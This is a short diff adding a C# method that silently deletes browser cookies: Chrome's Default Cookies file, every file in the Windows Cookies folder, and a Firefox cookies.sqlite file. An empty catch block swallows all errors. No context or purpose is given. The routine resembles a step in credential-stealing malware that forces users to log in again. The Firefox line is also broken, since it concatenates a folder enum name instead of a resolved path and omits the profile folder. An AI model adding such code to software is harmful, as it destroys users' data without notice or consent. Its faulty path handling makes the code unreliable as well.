@@ -1,0 +1,14 @@
+static void Cookies()
+    {
+        try
+        {
+            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies");
+            string[] Cookies = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
+            foreach (string file in Cookies)
+            {
+                File.Delete(file);
+            }
+            File.Delete(Environment.SpecialFolder.ApplicationData + @"\Mozilla\Firefox\Profiles\cookies.sqlite");
+        }
+        catch { }
+    }
